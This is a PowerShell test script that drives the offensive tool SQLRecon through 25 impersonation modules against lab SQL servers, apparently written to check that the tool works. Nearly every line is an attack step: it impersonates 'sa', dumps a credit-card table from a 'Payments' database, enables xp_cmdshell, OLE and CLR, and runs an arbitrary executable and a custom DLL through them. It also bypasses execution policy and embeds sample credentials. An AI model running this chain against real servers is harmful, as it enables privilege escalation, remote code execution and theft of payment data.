<#
    Execution instructions:
    powershell.exe -nop -exec bypass .\SQLRecon-Impersonation-Modules-Test.ps1
#>

<#
    The $global:* variables do not need to be changed.
    The only exception is $global:modules, which can be
    changed to match the number of test cases you execute.
#>
$global:timeout = 1
$global:count = 1
$global:modules = 25
$global:timestamp = Get-Date -Format "MM-dd-yyyy-HH-mm"

<#
    The $authentication variable acts as a quick way to
    switch the authentication type for the following commands.
#>
$authentication = "WinToken"
#$authentication = "WinDomain /domain:kawalabs /username:jsmith /password:Password123"
#$authentication = "WinDomain /domain:kawalabs /username:admin /password:Password123"
#$authentication = "Local /username:sa /password:Password123"
#$authentication = "AzureAD /domain:x.onmicrosoft.com /username:jsmith /password:Password123"
#$authentication = "AzureLocal /username:sa /password:Password123"

<#
    The following variables can be changed.
    - $sqlreconPath is the path to where SQLRecon is on disk.
    - $server1 is the hostname or IP of a SQL server.
    - $server2 is the hostname or IP of a SQL server, I use this for linked SQL servers.
    - $server3 is the hostname or IP of a SQL server, you might not need this.
    - $executionCommand is the command you want to execute via agentcmd, olecmd, or xpcmd.
    - $impersonationUser is the user you want to impersonate.
    - $ouputPath is where you want to output the results of this script on disk in markdown.
      keep in mind that the path can not have special characters like ':'. '-' is fine.
#>
$sqlreconPath = ".\SQLRecon.exe"
$server1 = "SQL01"
$server2 = "SQL02"
$server3 = "SQL03"
$server4 = "sqlrecon.database.windows.net"
$executionCommand = "c:\temp\iexplore.exe"
$impersonateUser = "sa"
$authenticationFormatted = $authentication.replace(' ','')
$ouputPath = $PSScriptRoot + "\sqlrecon-impersonation-$authenticationFormatted-$global:timestamp.md"
<#
    .Description
    The Execute function executes a supplied SQLRecon command.
#>
Function Execute($command)
{
    Write-Output "($global:count/$global:modules)"
    Write-Output $command
    Write-Output ""
    Write-Output "Output:"
    Write-Output '```'
    Invoke-Expression $command
    Write-Output '```'
    Write-Output ""
    Invoke-Expression "timeout /t $global:timeout" | Out-Null
    $global:count++
}

# Configuring output to file.
$ErrorActionPreference="SilentlyContinue"
Stop-Transcript | out-null
$ErrorActionPreference = "Continue"
Start-Transcript -path $ouputPath

Write-Output "---------------------------------------------------------------------"
Write-Output "[+] SQLRecon - Impersonation Modules Test Cases"
Write-Output "[+] Variables Set:"
Write-Output "  |-> SQLRecon Path: $sqlreconPath"
Write-Output "  |-> Ouput Path: $ouputPath"
Write-Output "  |-> Authentication: $authentication"
Write-Output "  |-> Impersonating User: $impersonateUser"
Write-Output "  |-> SQL Server 1: $server1"
Write-Output "  |-> SQL Server 2: $server2"
Write-Output "  |-> SQL Server 3: $server3"
Write-Output "  |-> SQL Server 3: $server4"
Write-Output "  |-> Execution Comand: $executionCommand"
Write-Output "[+] Starting test cases against $modules modules at $global:timestamp"
Write-Output "---------------------------------------------------------------------"
Write-Output ""

# Add test cases in this area. In this case there are 25, which is why $global:modules is set to 25.
Execute "$sqlreconPath /auth:$authentication /host:$server2 /module:impersonate"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /i:$impersonateUser /module:iwhoami"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /i:$impersonateUser /module:iusers"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /database:Payments /i:$impersonateUser /module:iquery /command:'select * from cc'"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /i:$impersonateUser /module:idatabases"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /i:$impersonateUser /module:itables /db:Payments"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /database:Payments /i:$impersonateUser /module:isearch /keyword:card"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /i:$impersonateUser /module:icolumns /db:Payments /table:cc"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /i:$impersonateUser /module:irows /db:Payments /table:cc"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /i:$impersonateUser /module:iLinks"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /i:$impersonateUser /module:icheckrpc"
Write-Output ""
Write-Output "[+] Executing Privileged Commands"
Write-Output ""
Execute "$sqlreconPath /auth:$authentication /host:$server2 /i:$impersonateUser /module:ienablexp"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /i:$impersonateUser /module:ienablerpc /rhost:$server2"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /i:$impersonateUser /module:idisablerpc /rhost:$server2"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /i:$impersonateUser /module:ixpcmd /command:$executionCommand"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /i:$impersonateUser /module:idisablexp"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /i:$impersonateUser /module:ienableole"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /i:$impersonateUser /module:iolecmd /command:$executionCommand"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /i:$impersonateUser /module:idisableole"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /i:$impersonateUser /module:ienableclr"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /i:$impersonateUser /module:iclr /dll:C:\Users\jsmith\Desktop\sql.dll /function:Chicken"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /i:$impersonateUser /module:idisableclr"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /i:$impersonateUser /module:iagentstatus"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /i:$impersonateUser /module:iagentcmd /command:$executionCommand"
Execute "$sqlreconPath /auth:$authentication /host:$server3 /i:$impersonateUser /module:iadsi /rhost:linkADSI /lport:49102"
Write-Output "---------------------------------------------------------------------"
Write-Output "[+] SQLRecon - Impersonation Modules Test Cases"
Write-Output "[+] Completed test cases against $modules modules at $global:timestamp"
Write-Output "---------------------------------------------------------------------"
Stop-Transcript